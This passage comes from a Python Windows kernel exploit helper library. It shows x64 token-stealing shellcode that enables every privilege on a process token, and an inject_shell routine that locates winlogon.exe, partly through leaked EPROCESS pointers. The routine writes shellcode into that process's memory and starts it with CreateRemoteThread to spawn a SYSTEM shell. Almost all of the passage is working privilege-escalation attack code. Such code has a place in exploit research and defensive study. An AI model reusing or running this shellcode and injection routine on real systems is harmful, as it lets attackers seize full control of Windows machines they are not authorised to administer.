	if KTHREAD_Process > 0x7f:
		shellcode = shellcode + "\x48\x8b\x80" + struct.pack("B",KTHREAD_Process) + "\x00\x00\x00" # mov	 rax, [rax+0x68]		 ;Get current KTHREAD_Process address
	else:
		shellcode = shellcode + "\x48\x8b\x40" + struct.pack("B",KTHREAD_Process)
	
	shellcode = shellcode + ("\x48\x89\xc1"												# mov	 rcx, rax			;Copy current KTHREAD_Process address to RCX
	"\x48\x81\xC1" + struct.pack("H",EPROCESS_Token) + "\x00\x00"						# add rcx, 0x358 ; offset the Tokens
	"\x48\x8B\x01"																		# mov rax, qword ptr [rcx] ; copy pointer
	"\x48\x83\xE0\xF0"																	# and rax, 0x0FFFFFFFFFFFFFFF0 ; clear last 4 bits
	"\x48\xC7\x40\x48\xFF\xFF\xFF\xFF"													# mov qword ptr [rax+0x48], 0x0FFFFFFFFFFFFFFFF ; set the Enabled bits
	"\x48\xC7\x40\x40\xFF\xFF\xFF\xFF"													# mov qword ptr [rax+0x40], 0x0FFFFFFFFFFFFFFFF ; set the Present bits
	)
	
	shellcode += extra #append extra code after token stealing shellcode, e.g.: restore stack
	if RETVAL == "":
		shellcode += "\xc3"						#retn
	else:
		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
	
	shellcode = shellcode + '\x90' * (len(shellcode) % 4)
	return shellcode

def tokenstealing(RETVAL, extra = ""):
	print "[*] Creating token stealing shellcode"
	if platform.architecture()[0] == '64bit': return tokenstealingx64(RETVAL, extra)
	else: return tokenstealingx86(RETVAL, extra)
	
def getosvariablesx():
	if platform.architecture()[0] == '64bit': return getosvariablesx64()
	else: return getosvariablesx86()
	
def inject_shell(manager_palette=None, worker_palette=None):
	"""Impersonate privileged token and inject shellcode into winlogon.exe"""

	# Get winlogon.exe pid
	if manager_palette != None and worker_palette != None:
		pointer_EPROCESS = leak_eprocess_address_palette(manager_palette, worker_palette)
		(pid, pid_EPROCESS) = find_pid_and_eprocess_by_name_palette(manager_palette, worker_palette, pointer_EPROCESS, "winlogon.exe")
	else:
		pid = getpid("winlogon.exe")
	# Get a handle to the winlogon process we are injecting into 
	hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

	if not hProcess:
		print "[-] Couldn't acquire a handle to PID: %s" % pid
		sys.exit(-1)

	print "[+] Obtained handle 0x%x for the winlogon.exe process" % hProcess

	# Creating shellcode buffer to inject into the host process
	sh = create_string_buffer(SHELLCODE_EXEC_CMD_X64, len(SHELLCODE_EXEC_CMD_X64))
	code_size = len(SHELLCODE_EXEC_CMD_X64)	

	# Allocate some space for the shellcode (in the program memory)
	sh_address = kernel32.VirtualAllocEx(hProcess, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
	if not sh_address:
		print "[-] Could not allocate shellcode in the remote process"
		getLastError()
		sys.exit(-1)

	print "[+] Allocated memory at address 0x%x" % sh_address

	# Inject shellcode in to winlogon.exe process space
	written = LPVOID(0)
	shellcode = LPVOID(sh_address)
	dwStatus = kernel32.WriteProcessMemory(hProcess, shellcode, sh, code_size, byref(written))
	if not dwStatus:
		print "[-] Could not write shellcode into winlogon.exe, exiting..."
		getLastError()
		sys.exit(-1)

	print "[+] Injected %d bytes of shellcode to 0x%x" % (written.value, sh_address)

	# Now we create the remote thread and point its entry routine to be head of 
	# our shellcode
	thread_id = HANDLE(0)
	if not kernel32.CreateRemoteThread(hProcess, 0, 0, sh_address, 0, 0, byref(thread_id)):
		print "[-] Failed to inject shellcode into winlogon.exe, exiting..."
		sys.exit()

	print "[+] Remote thread  0x%08x created" % thread_id.value
	print "[+] Spawning SYSTEM shell..."
	# Kill python process to kill the window and avoid BSODs
	os.kill(os.getpid(), signal.SIGABRT)
